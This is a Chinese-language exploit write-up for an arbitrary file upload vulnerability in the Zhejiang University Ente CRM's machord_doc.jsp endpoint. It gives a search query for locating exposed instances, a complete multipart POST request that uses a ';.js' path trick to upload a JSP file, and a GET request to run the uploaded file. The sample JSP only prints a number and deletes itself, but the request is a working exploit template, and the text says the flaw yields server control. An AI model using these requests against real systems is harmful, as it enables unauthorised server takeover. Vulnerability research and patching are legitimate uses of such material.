# 浙大恩特CRM machord_doc任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM machord_doc存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="浙大恩特 CRM"`
+ 特征

![1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png](./img/nhFAeXcr4y8xhjuV/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-756266.png)

# 四、漏洞复现
```plain
POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&machordernum&fileName=stc.jsp&strAffixStr&oprfilenam=null&gesnum HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 575
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="oprfilenam"

null
--00content0boundary00
Content-Disposition: form-data; name="uploadflg"

0
--00content0boundary00
Content-Disposition: form-data; name="strAffixStr"


--00content0boundary00
Content-Disposition: form-data; name="selfilenam"


--00content0boundary00
Content-Disposition: form-data; name="uploadfile"; filename="stc.jsp"
Content-Type: image/png

<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
--00content0boundary00--
```

![1706508362663-ac7d958a-027b-4f36-9e67-183cc0b2540e.png](./img/nhFAeXcr4y8xhjuV/1706508362663-ac7d958a-027b-4f36-9e67-183cc0b2540e-024310.png)

上传文件位置

```plain
GET /enterdoc/Machord/stc.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.2657.7 Safari/537.36
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1706508460084-9c5cdce9-bc55-4c59-b11d-dab02bb03a17.png](./img/nhFAeXcr4y8xhjuV/1706508460084-9c5cdce9-bc55-4c59-b11d-dab02bb03a17-109299.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ey7q3elsbgbv3mnc>